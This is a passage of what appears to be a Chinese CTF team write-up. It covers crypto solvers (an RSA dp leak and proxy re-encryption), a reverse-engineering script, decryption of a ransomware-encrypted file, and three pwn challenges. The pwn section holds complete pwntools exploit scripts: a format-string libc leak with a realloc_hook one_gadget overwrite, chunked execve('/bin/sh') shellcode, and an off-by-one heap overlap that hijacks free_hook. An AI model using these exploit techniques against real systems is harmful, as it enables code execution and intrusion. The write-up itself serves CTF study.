71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81]# [4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579] 算是放了一个签到题，$seed$啥都给了，照着种子还原$rands$再异或还原$d_p$就行，最终已知$d_p,n,e,c$解密，梭就完了，需要注意的是$py2,py3$的$random$不太相同，这里必须使用$py2$。 #py2import randomseeds=[4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579]res=[55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81]dp=''for i in range(len(seeds)): random.seed(seeds[i]) for j in range(4): x=random.randint(0,255) if j==i%4: xx=x^res[i] print(chr(xx)) dp+=chr(xx)print(dp)#py3import gmpy2from Crypto.Util.number import *def boom_dp(n,e,c,dp): for x in range(1, e): if(e*dp%x==1): p=(e*dp-1)//x+1 assert n%p==0 q=n//p phin=(p-1)*(q-1) d=gmpy2.invert(e, phin) m=pow(c, d, n) print(long_to_bytes(m))N=81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391e=65537c=61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151dp=5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057boom_dp(N,e,c,dp)#flag{74281db3-c6f0-e59a-4da6-39b8c71250fe} share secret#! /usr/bin/env pythonfrom libnum import n2s, s2nfrom random import getrandbitsfrom hashlib import sha256import SocketServerfrom secret import flagp, g = 0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3, \\ 0x85fd9ae42b57e515b7849b232fcd9575c18131235104d451eeceb991436b646d374086ca751846fdfec1ff7d4e1b9d6812355093a8227742a30361401ccc5577def h2(m): return int(sha256(m).hexdigest(), 16)def key_gen(nbits): s = getrandbits(nbits) % p while s.bit_length() &lt; nbits - 2: s = getrandbits(nbits) % p pk = pow(g, s, p) return pk, sdef enc(m, pk): m = s2n(m) e, v = getrandbits(256), getrandbits(256) E, V = pow(g, e, p), pow(g, v, p) s = v + e * h2(n2s(E) + n2s(V)) c = m * pow(pk, e + v, p) % p cap = (E, V, s) return c, capdef rk_gen(sk, pki, group=9): x, r = getrandbits(512) % p, getrandbits(512) % p prefix = n2s(pow(g, x * sk, p)).rjust(64, '\\x00') encoder = [1, -pow(pki, x * sk, p) % p] for i in range(1, group + 1): pkj = getrandbits(512) new_encoder = [1] cur = pow(pkj, x * sk, p) for j in range(1, i + 1): new_encoder.append((encoder[j] + (-1) * cur * encoder[j - 1]) % p) new_encoder.append(encoder[i] * cur * (-1) % p) encoder = new_encoder encoder[-1] += r dd = h2(prefix + n2s(r).rjust(64, '\\x00')) | 1 rk = sk * dd return rk, encoder[1:], prefixdef re_enc(rk, cipher): c, (E, V, s) = cipher E_ = pow(E, rk, p) V_ = pow(V, rk, p) s_ = s * rk % p return c, (E_, V_, s_)class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer): passclass EncHandler(SocketServer.BaseRequestHandler): def handle(self): self.request.sendall(&quot;Welcome to our netdisk system! Our system store only users' ciphertext\\n&quot;) self.request.sendall(&quot;Now you can choose what you wanna do\\n&quot;) self.request.sendall(&quot;1. generate your key\\n2. start challenge\\n2. get the ciphertext&quot;) pk_of_one_user, sk_of_one_user = key_gen(512) cipher = enc(flag, pk_of_one_user) pk, sk = key_gen(512) while 1: mul = 1 self.request.sendall('Input your choice\\n') self.request.sendall(&quot;choice&gt;&quot;) choice = self.request.recv(16).strip() if choice == '1': self.request.sendall('Please take good care of it!\\n' + hex(pk) + ',' + hex(sk) + '\\n') elif choice == '2': group_list = [32, 64, 128, 256] for group in group_list: m = getrandbits(200) plaintext = n2s(m) cur_cipher = enc(plaintext, pk_of_one_user) rk, encoder, prefix = rk_gen(sk_of_one_user, pk, group=group) mul *= rk mul %= p new_cipher = re_enc(rk, cur_cipher) self.request.sendall('The cipher shared to you\\n' + str(new_cipher) + '\\n') self.request.sendall('prefix, encoder = ' + str((encoder, prefix.encode('hex'))) + '\\n') ans = self.request.recv(1024).strip() if int(ans, 16) != m: exit(1) self.request.sendall('You are a clever boy! Now I can share you some other information!\\n' + hex(mul) + '\\n') elif choice == '3': self.request.sendall(str(cipher) + '\\n') exit(1) else: continueif __name__ == &quot;__main__&quot;: HOST, PORT = &quot;0.0.0.0&quot;, 1213 server = ThreadedTCPServer((HOST, PORT), EncHandler) server.serve_forever() from libnum import n2s, s2nfrom hashlib import sha256from gmpy2 import *from pwn import *def h2(m): return int(sha256(m).hexdigest(), 16)p=remote('47.104.85.225',62351)context.log_level='debug'#1p.recvuntil('choice&gt;')p.sendline('1')p.recvuntil('Please take good care of it!\\n')pk_sk=p.recvuntil('\\n')[:-1].decode()[2:-1].split('L,0x')pk,sk=int(pk_sk[0],16),int(pk_sk[1],16)#2p.recvuntil('choice&gt;')p.sendline('2')pp, g = 0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3, \\ 0x85fd9ae42b57e515b7849b232fcd9575c18131235104d451eeceb991436b646d374086ca751846fdfec1ff7d4e1b9d6812355093a8227742a30361401ccc5577 group_list = [32, 64, 128, 256]D=1for group in group_list: p.recvuntil('The cipher shared to you\\n') cc=int(p.recvuntil('L, ')[1:-3]) new_cipher=[cc] new_cipher+=eval(p.recvuntil(')\\n')[:-2].decode().replace('L','')) c,E_,V_,s_=new_cipher p.recvuntil('prefix, encoder = ') lateset_encoder,prefix=pre_enc=eval(p.recvuntil('\\n')[:-1].decode().replace('L','')) prefix=int(prefix,16) encoder=[1,(-pow(prefix,sk,pp)) %pp] prefix = n2s(prefix).rjust(64, b'\\x00') ml=[1] for i in range(len(lateset_encoder)): ml.append((ml[-1]*encoder[-1]+lateset_encoder[i]*(-1)**(i+1))%pp) r=-ml[-1]%pp dd = h2(prefix + n2s(r).rjust(64, b'\\x00')) | 1 D*=dd d=invert(dd,pp-1) cccc=E_*V_%pp xx=pow(cccc,d,pp) m=c*invert(xx,pp)%pp p.send(hex(m)[2:])p.recvuntil('You are a clever boy! Now I can share you some other information!\\n0x')mul=int(p.recvuntil('\\n')[:-2],16)print(&quot;*****************************************************&quot;)print(D)print(mul)print(&quot;*****************************************************&quot;)#3p.recvuntil('choice&gt;')p.sendline('3')cc=int(p.recvuntil('L, ')[1:-3])cipher=[cc]cipher+=eval(p.recvuntil(')\\n')[:-2].decode().replace('L',''))print(&quot;*****************************************************&quot;)print(cipher)print(&quot;*****************************************************&quot;)'''from gmpy2 import *p=0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3D=mul=c=mul*invert(D,p)%pe=4R.&lt;x&gt; = Zmod(p)[]f = x ^ e- cf = f.monic()res1 = f.roots()print(res1)''''''from Crypto.Util.number import *from gmpy2 import *pp=0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3sk=3415391405045794570454819264678842883406589094879440924771251075986414212665514615692960890299627279215019657097231396800926908716766924569917256830117771cipher=[2527933870918239983384943711339580604598094277545525217834226330258419910301299206846573883556622915108773654201000637301174540362470098333217770989148988, 1534944798391033818702709152362158543885444981173771976353948339054898890879750350964082465225558424319599976320653165768478628695969238760863936634123497, 6480111027732079088305364577732332359884279592380152181509453693475437439597161069742983512858501419606525584662299391909461177747617022491590642108315732, 3294517958162409271434180708054007225109922377603959481825421096746414863994421950281118003999380326689412683711381872657890904915131742940967848977783892]c,E,V,s=cipherxx=E*V%ppm=c*invert(pow(xx,sk,pp),pp)%ppprint(long_to_bytes(m))#flag{504d0411-6707-469b-be31-9868200aca95}''' ReverseRev_Dizzy一串简单的数学计算，首先是IDA F5，挺慢的，多等等，如果提示要逆的太大了，就自己百度一下，改一下 给了运算、给了最后比较的值，逆一下就行了，将所有复制出来，只留下运算的部分，然后写个脚本 s = [0x27, 0x3C, 0xE3, 0xFC ,46 ,65 ,7 ,94 ,98 ,-49 ,-24 ,-14 ,-110 ,128 ,-30 ,54 ,-76 ,-78 ,103 ,119 ,15 ,-10 ,13 ,-74 ,-19 ,28 ,101 ,-118 ,7 ,83 ,-90 ,102]f = open('1.txt','r').readlines()for i in range(len(f)): if(i != len(f)-1): f[i] = f[i][:-2] else: f[i] = f[i][:-1]f1 = ['']*len(f)for i in range(len(f)): f1[i] = f[len(f)-1-i]for i in range(len(f1)): tmp = f1[i].replace('byte_43841C', 's') if('+=' in tmp): tmp = tmp.replace('+=','-=') elif('-=' in tmp): tmp = tmp.replace('-=','+=') else: pass exec(tmp)for i in range(len(s)): print(chr(s[i]%256),end='') flag{Try_R3vers1ng_W1th_ScR!pt!} 勒索病毒用生成文件的修改时间为时间戳。 查阅官方文档发现，0x800c是sha256，加密方式为0x660E,此为iv为零向量。 import hashlibfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpad,padkey=bytearray([ 0xB2, 0x2F, 0xC6, 0x0E, 0x4F, 0xD4, 0x54, 0x4B, 0x05, 0x11, 0x1A, 0x61, 0x21, 0xE7, 0xB1, 0x8E])key=hashlib.sha256(key).hexdigest()key=bytes.fromhex(key)[:16]iv=b'\\x00'*16f1=open(&quot;flag.bmp.ctf_crypter&quot;,&quot;rb&quot;)f2=open(&quot;flag.bmp&quot;,&quot;wb&quot;)data=f1.read()ae=AES.new(key,AES.MODE_CBC,iv)f2.write(ae.decrypt(pad(data,16)))f1.close()f2.close() PWN队友真强，完全被带飞，做了俩pwn，还有俩pwn卡到一个点上，摸啦|pwn👴👴带我飞，才发现我好菜 note思路：自己构建格式化字符串漏洞，这里泄露打IO_STDOUT，然后再打realloc_hook为onegadget，需要抬栈，卡在抬栈这个地方啦，然后直接rceexp： #coding:utf-8from pwn import *context.log_level = &quot;debug&quot;p = process(&quot;./note&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)#libc=ELF('/home/roo/桌面/glibc-all-in-one-master/glibc-all-in-one-master/libs/2.23-0ubuntu11.2_amd64/libc.so.6')#p = remote(&quot;47.104.70.90&quot;,25315)elf = ELF(&quot;./note&quot;)def add(size,content): p.recvuntil(&quot;choice: &quot;) p.sendline(&quot;1&quot;) p.sendlineafter(&quot;size: &quot;,str(size)) p.sendlineafter(&quot;content: &quot;,content) p.recvuntil(&quot;addr: &quot;) #heap_addr = int(p.recv(6).ljust(8,&quot;\\x00&quot;))def show(): p.recvuntil(&quot;choice: &quot;) p.sendline(&quot;3&quot;) p.recvuntil(&quot;content:&quot;) content = p.recv() gdb.attach(p,'$rebase 0x1235')p.recvuntil(&quot;choice: &quot;) p.sendline(&quot;2&quot;)p.recvuntil(&quot;say ? &quot;)p.sendline(&quot;%7$s\\x00&quot;)payload = p64(0xfbad1800) + p64(0)*3p.sendline(payload)raw_input()libc_base = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,&quot;\\x00&quot;)) -0x3c36e0malloc_hook = libc_base + libc.sym[&quot;__malloc_hook&quot;]success(&quot;libc_base:&quot;+hex(libc_base))success(&quot;malloc_hook:&quot;+hex(malloc_hook))rce =0x4527a + libc_baserealloc = libc_base + libc.sym[&quot;realloc&quot;] realloc_hook = libc_base + libc.sym[&quot;__realloc_hook&quot;]payload = &quot;%7$s\\x00\\x00\\x00\\x00&quot;+p64(realloc_hook)p.recvuntil(&quot;choice: &quot;)p.sendline(&quot;2&quot;)p.recvuntil(&quot;say ? &quot;)p.sendline(payload)raw_input()#gdb.attach(p)payload = p64(rce) + p64(realloc+6)p.recvuntil(&quot;? &quot;)p.sendline(payload)p.sendlineafter(&quot;choice:&quot;,&quot;1&quot;)p.sendlineafter(&quot;size:&quot;,&quot;2&quot;)p.interactive() JigSaw’sCage额哈，前面有长整型溢出，这个题是写shellcode的一道题，test有执行权限，难点就是只能写入0x10大小的内容，shellcode不可能只有0x10，难点考验shellcode，分chunk写入，然后再test一下即可exp： from pwn import *context.log_level = 'debug'p = process('./JigSAW')context.arch = &quot;amd64&quot;def add(idx): p.sendlineafter(&quot;Choice :&quot;, &quot;1&quot;) p.sendlineafter(&quot;Index? :&quot;, str(idx))def show(idx): p.sendlineafter(&quot;Choice :&quot;, &quot;5&quot;) p.sendlineafter(&quot;Index? :&quot;, str(idx))def edit(idx, content): p.sendlineafter(&quot;Choice :&quot;, &quot;2&quot;) p.sendlineafter(&quot;Index? :&quot;, str(idx)) p.sendafter(&quot;iNput:&quot;, content)def free(idx): p.sendlineafter(&quot;Choice :&quot;, &quot;3&quot;) p.sendlineafter(&quot;Index? :&quot;, str(idx))def test(idx): p.sendlineafter(&quot;Choice :&quot;, &quot;4&quot;) p.sendlineafter(&quot;Index? :&quot;, str(idx))s1 = asm(&quot;mov rsp, rdx\\nadd rsp, 0x20\\npush rsp&quot;)s2 = asm(&quot;mov rax, 0x68732f6e69622f\\nadd rsp, 0x20\\npush rsp&quot;)s3 = asm(&quot;push rax\\nmov rdi, rsp\\nxor rsi, rsi\\nadd rsp, 0x28\\npush rsp&quot;)s4 = asm(&quot;xor rdx, rdx\\nmov rax, 59\\nsyscall\\n&quot;)p.sendlineafter(&quot;Name:&quot;, &quot;max&quot;)p.sendlineafter(&quot;Choice:&quot;, str(0xffffffff+1)) #int len overlapadd(0)add(1)add(2)add(3)edit(0,s1)edit(1, s2)edit(2, s3)edit(3, s4)test(0)p.interactive() PassWordBox_FreeVersion额哈，这道题，卡在了加密这东西的地方，后来发现可以泄露固定值，然后再进行异或就可以得到明文，想要写入明文，二次异或即可，有off-by-one，可以造overlap，直接打freehook为onegdaget即可，（这道题是赛后出来的）exp： #coding:utf8from pwn import *sh = process('./pwdFree')#sh = remote('47.104.71.220',38562)libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def add(index,size,content): sh.sendlineafter('Choice:','1') sh.sendlineafter('Save:',str(index)) sh.sendlineafter('Pwd:',str(size)) sh.sendafter('Pwd:',content)def edit(index,content): sh.sendlineafter('Choice:','2') sh.sendline(str(index)) sleep(0.5) sh.send(content)def show(index): sh.sendlineafter('Choice:','3') sh.sendlineafter('Check:',str(index))def delete(index): sh.sendlineafter('Choice:','4') sh.sendlineafter('Delete:',str(index))add(0,1,'\\x00')sh.recvuntil('Save ID:')random = u64(sh.recv(8))print 'cookie=',hex(random)add(1,0xF0,'a'*0xF0) #1add(2,0x80,'b'*0x80) #2add(3,0x80,'c'*0x80) #3add(4,0xF0,'d'*0xF0) #4for i in range(5,12): add(i,0xF0,'aaaa'*0xd0)for i in range(5,12): delete(i)delete(3)add(3,0x88,'b'*0x80 + p64((0x100 + 0x90 + 0x90) ^ random) + '\\x00')delete(1)delete(4)for i in range(5,12): add(i,0xF0,'a'*0xf0)add(1,0xF0,'a'*0xF0) #1show(2)sh.recvuntil('Pwd is: ')libc_base = (u64(sh.recv(8)) ^ random) - 0x3ebca0system_addr = libc_base + libc.sym['system']free_hook_addr = libc_base + libc.sym['__free_hook']'''0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints: rsp &amp; 0xf == 0 rcx == NULL0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints: [rsp+0x40] == NULL0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULL '''onegdaget=0x4f432delete(3)add(3,0x98,'b'*0x80 + (p64(0 ^ random) + p64(0x91 ^ random) + p64(free_hook_addr ^ random)))add(20,0x80,p64(0) + 'c'*0x78)add(21,0x80,p64(onegdaget ^ random) + 'd'*0x78)delete(11)sh.interactive() 总结：队友带我飞，lemmon那道题也不难，是SROP ，doublfree 劫持tc。修改fd指向unsortedbin切割下来的chunk，可以劫持freehook为setcontet，然后srop，出来flag，我没做，思路是这","link":"/posts/62454/"}],"tags":[{"name":"WP","slug":"WP","link":"/tags/WP/"}],"categories":[]}